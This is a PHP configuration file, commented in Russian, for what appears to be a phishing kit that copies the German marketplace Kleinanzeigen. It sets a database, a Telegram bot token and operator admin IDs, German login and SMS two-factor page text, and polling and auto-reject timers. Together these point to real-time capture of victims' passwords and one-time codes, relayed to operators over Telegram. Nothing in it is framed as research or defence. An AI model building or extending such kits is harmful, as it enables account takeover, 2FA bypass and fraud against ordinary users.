<?php

/**
 * Конфиг. В Docker значения берутся из переменных окружения (.env).
 * Локально можно править defaults ниже или создать .env + docker compose.
 */

$dbHost = getenv('DB_HOST') ?: '127.0.0.1';
$dbPort = getenv('DB_PORT') ?: '8889';
$dbName = getenv('DB_NAME') ?: 'kleinanzeigen_login';
$dbUser = getenv('DB_USER') ?: 'root';
$dbPass = getenv('DB_PASSWORD') !== false ? getenv('DB_PASSWORD') : 'root';

$baseUrl = rtrim((string)(getenv('BASE_URL') ?: 'https://example.com'), '/');
$tgToken = (string)(getenv('TELEGRAM_TOKEN') ?: 'YOUR_BOT_TOKEN');
$tgSecret = (string)(getenv('TELEGRAM_WEBHOOK_SECRET') ?: 'CHANGE_ME_TO_RANDOM_SECRET');

$adminsRaw = (string)(getenv('TELEGRAM_SUPER_ADMINS') ?: '');
$superAdmins = [];
foreach (preg_split('/[,\s]+/', $adminsRaw, -1, PREG_SPLIT_NO_EMPTY) as $id) {
    if (ctype_digit($id)) {
        $superAdmins[] = (int)$id;
    }
}

return [
    'db' => [
        'host'     => $dbHost,
        'port'     => $dbPort,
        'name'     => $dbName,
        'user'     => $dbUser,
        'password' => $dbPass,
        'charset'  => 'utf8mb4',
    ],

    'base_url' => $baseUrl,

    'telegram' => [
        'token'          => $tgToken,
        'webhook_secret' => $tgSecret,
        'super_admins'   => $superAdmins,
    ],

    'defaults' => [
        // --- Login page ---
        'login_title'          => 'Willkommen bei Kleinanzeigen!',
        'login_subtitle'       => 'Gut für deinen Geldbeutel, gut für die Umwelt - jetzt einloggen.',
        'login_button'         => 'Einloggen',
        'login_button_continue'=> 'Weiter',
        'login_forgot'         => 'Passwort vergessen?',
        'login_register'       => 'Noch nicht registriert? Erstelle ein Konto',
        'login_error'          => 'Die E-Mail-Adresse ist nicht registriert oder das Passwort ist falsch. Bitte überprüfe deine Eingaben.',
        'login_email_label'    => 'E-Mail*',
        'login_password_label' => 'Passwort*',
        'login_edit_link'      => 'Bearbeiten',
        'login_loading_text'   => 'Anmeldung wird überprüft…',

        // --- 2FA page ---
        'modal_title'         => 'Identität bestätigen',
        'modal_description'   => 'Wir haben eine SMS an folgende Nummer gesendet:',
        'button_text'         => 'Fortfahren',
        'placeholder'         => '6-stelligen Code eingeben*',
        'number_prefix'       => 'XXXXXXXXXX',
        'header_help'         => 'Hilfe',
        'resend_question'     => 'Sie haben keinen Code erhalten?',
        'resend_link'         => 'Erneut senden',
        'loading_text'        => 'Code wird überprüft…',
        'success_text'        => 'Bestätigt!',
        'success_description' => 'Sie können dieses Fenster jetzt schließen.',
        'error_text'          => 'Falscher Code',
        'error_description'   => 'Bitte überprüfen Sie den Code und versuchen Sie es erneut.',
        'not_found_title'         => 'Link nicht gefunden',
        'not_found_description'   => 'Diese Seite ist nicht verfügbar oder wurde deaktiviert.',

        // --- Technical ---
        'auto_reject_seconds' => '120',
        'polling_interval_ms' => '2000',
        'presence_interval_ms' => '12000',
    ],
];
